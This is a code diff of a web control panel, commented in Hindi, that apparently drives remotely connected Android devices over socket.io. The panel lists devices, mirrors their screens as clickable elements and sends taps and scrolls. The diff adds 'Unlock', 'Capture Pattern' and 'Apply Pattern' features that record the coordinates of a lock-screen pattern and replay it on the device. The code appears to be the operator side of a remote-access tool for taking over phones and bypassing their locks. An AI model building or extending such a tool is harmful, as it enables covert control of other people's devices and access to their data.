@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Screen Control</title>
+    <title>Screen Control - Ultimate</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap');
         
@@ -26,7 +26,7 @@
 
         /* ===== कंट्रोल व्यू ===== */
         #control-view { flex-direction: column; }
-        .control-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background-color: #1e1e1e; border-bottom: 1px solid #333; }
+        .control-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background-color: #1e1e1e; border-bottom: 1px solid #333; flex-wrap: wrap; gap: 10px; }
         #back-to-list-btn { background-color: #3f3f46; color: white; border: 1px solid #555; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-size: 1em; }
         #device-title { font-size: 1.2em; font-weight: bold; }
         .main-container { display: flex; flex-grow: 1; }
@@ -36,11 +36,17 @@
         .screen-element { position: absolute; border: 1px solid rgba(0, 255, 255, 0.6); background-color: rgba(0, 139, 139, 0.2); box-sizing: border-box; cursor: pointer; display: flex; align-items: center; justify-content: center; text-align: center; padding: 2px; }
         .element-text { color: white; font-size: 12px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 100%; }
         
-        /* मुख्य बदलाव: दाईं ओर की कंट्रोल पट्टी */
         .all-controls { width: 80px; background-color: #1e1e1e; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 12px; padding: 10px; }
         .control-button { width: 55px; height: 55px; background-color: #3f3f46; border: 1px solid #555; color: white; border-radius: 50%; cursor: pointer; font-size: 24px; transition: background-color 0.2s; display: flex; align-items: center; justify-content: center; }
         .control-button:hover { background-color: #555; }
         .divider { height: 1px; width: 80%; background-color: #444; margin: 10px 0; }
+
+        /* नए बटनों के लिए स्टाइल */
+        .advanced-controls { display: flex; gap: 10px; }
+        .advanced-controls button { background-color: #333; border: 1px solid #555; color: #ccc; padding: 8px 12px; border-radius: 5px; cursor: pointer; }
+        .advanced-controls button:hover { background-color: #444; }
+        .advanced-controls button:disabled { background-color: #252526; color: #666; cursor: not-allowed; }
+        .capture-mode { background-color: #ff4500 !important; color: white !important; box-shadow: 0 0 10px #ff4500; }
     </style>
 </head>
 <body>
@@ -60,6 +66,11 @@
         <div class="control-header">
             <button id="back-to-list-btn">← Back to List</button>
             <h2 id="device-title"></h2>
+            <div class="advanced-controls">
+                <button id="btn-unlock">🔓 Unlock</button>
+                <button id="btn-capture-pattern">🎨 Capture Pattern</button>
+                <button id="btn-apply-pattern" disabled>✍️ Apply Pattern</button>
+            </div>
         </div>
         <div class="main-container">
             <div class="screen-area">
@@ -67,7 +78,6 @@
                     <div id="screen-container"></div>
                 </div>
             </div>
-            <!-- मुख्य बदलाव: सभी कंट्रोल बटन अब यहाँ हैं -->
             <div class="all-controls">
                 <button class="control-button" id="btn-scroll-up">↑</button>
                 <button class="control-button" id="btn-scroll-left">←</button>
@@ -83,23 +93,39 @@
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        // जावास्क्रिप्ट कोड में कोई बदलाव नहीं है, यह पहले जैसा ही रहेगा
         const socket = io();
+
+        // व्यू एलिमेंट्स
         const deviceListView = document.getElementById('device-list-view');
         const controlView = document.getElementById('control-view');
+
+        // डिवाइस सूची एलिमेंट्स
         const deviceListEl = document.getElementById('device-list');
+        
+        // कंट्रोल पैनल एलिमेंट्स
         const screenContainer = document.getElementById('screen-container');
         const screenViewport = document.getElementById('screen-viewport');
         const deviceTitleEl = document.getElementById('device-title');
         const backToListBtn = document.getElementById('back-to-list-btn');
+
+        // नए बटनों के लिए वेरिएबल्स
+        const unlockBtn = document.getElementById('btn-unlock');
+        const capturePatternBtn = document.getElementById('btn-capture-pattern');
+        const applyPatternBtn = document.getElementById('btn-apply-pattern');
+
         let devices = {};
         let activeDeviceId = null;
+        let isCaptureMode = false;
+        let capturedPattern = [];
+        let savedPattern = null;
 
+        // --- व्यू बदलने का लॉजिक ---
         function showView(viewId) {
             document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
             document.getElementById(viewId).classList.add('active');
         }
 
+        // --- सॉकेट इवेंट्स ---
         socket.on('connect', () => socket.emit('admin_join'));
         socket.on('device_list', (initialDevices) => { deviceListEl.innerHTML = ''; devices = {}; initialDevices.forEach(addDeviceToList); });
         socket.on('new_device_joined', addDeviceToList);
@@ -135,6 +161,7 @@
             deviceListEl.appendChild(li);
         }
 
+        // --- स्क्रीन अपडेट लॉजिक ---
         socket.on('screen_update', (data) => {
             if (data.deviceId !== activeDeviceId) return;
             screenContainer.innerHTML = '';
@@ -157,14 +184,28 @@
                 else if (contentDescription.toLowerCase().includes("navigate up") || contentDescription.toLowerCase().includes("drawer")) { textEl.textContent = '≡'; textEl.style.fontSize = '20px'; }
                 else { textEl.textContent = element.text || contentDescription; }
                 el.appendChild(textEl);
-                el.addEventListener('click', () => { const tapX = element.x + (element.width / 2), tapY = element.y + (element.height / 2); socket.emit('command_to_device', { deviceId: activeDeviceId, action: 'touch_command', payload: { x: Math.round(tapX), y: Math.round(tapY) } }); });
+                
+                el.addEventListener('click', () => {
+                    const tapX = Math.round(element.x + (element.width / 2));
+                    const tapY = Math.round(element.y + (element.height / 2));
+                    
+                    if (isCaptureMode) {
+                        capturedPattern.push({ x: tapX, y: tapY });
+                        el.style.backgroundColor = 'rgba(255, 69, 0, 0.7)';
+                        console.log(`Pattern point added: (${tapX}, ${tapY})`);
+                    } else {
+                        socket.emit('command_to_device', { deviceId: activeDeviceId, action: 'touch_command', payload: { x: tapX, y: tapY } });
+                    }
+                });
                 screenContainer.appendChild(el);
             });
         });
 
+        // --- कमांड भेजने का लॉजिक ---
         function sendGlobalAction(action) { if (!activeDeviceId) return; socket.emit('command_to_device', { deviceId: activeDeviceId, action: 'global_action', payload: { action: action } }); }
         function sendScrollAction(direction) { if (!activeDeviceId) return; socket.emit('command_to_device', { deviceId: activeDeviceId, action: 'scroll_action', payload: { direction: direction } }); }
         
+        // --- बटन इवेंट्स ---
         backToListBtn.onclick = () => {
             activeDeviceId = null;
             showView('device-list-view');
@@ -176,6 +217,48 @@
         document.getElementById('btn-scroll-down').onclick = () => sendScrollAction('down');
         document.getElementById('btn-scroll-left').onclick = () => sendScrollAction('left');
         document.getElementById('btn-scroll-right').onclick = () => sendScrollAction('right');
+
+        // --- नए बटनों के लिए इवेंट लिस्नर ---
+        unlockBtn.onclick = () => sendGlobalAction('unlock');
+
+        capturePatternBtn.onclick = () => {
+            isCaptureMode = !isCaptureMode;
+            if (isCaptureMode) {
+                capturedPattern = [];
+                capturePatternBtn.classList.add('capture-mode');
+                capturePatternBtn.textContent = '💾 Save Pattern';
+                console.log('Pattern capture mode ON. Click on pattern dots in order.');
+            } else {
+                capturePatternBtn.classList.remove('capture-mode');
+                capturePatternBtn.textContent = '🎨 Capture Pattern';
+                if (capturedPattern.length > 2) {
+                    savedPattern = capturedPattern;
+                    applyPatternBtn.disabled = false;
+                    console.log('Pattern saved:', savedPattern);
+                } else {
+                    console.log('Capture cancelled. Not enough points.');
+                }
+                capturedPattern = [];
+            }
+        };
+
+        applyPatternBtn.onclick = () => {
+            if (savedPattern) {
+                console.log('Applying saved pattern...');
+                socket.emit('command_to_device', {
+                    deviceId: activeDeviceId,
+                    action: 'apply_pattern',
+                    payload: savedPattern
+                });
+            }
+        };
+
+        // हार्टबीट
+        setInterval(() => {
+            if (socket.connected) {
+                socket.emit('heartbeat', {}); 
+            }
+        }, 30000);
     </script>
 </body>
 </html>
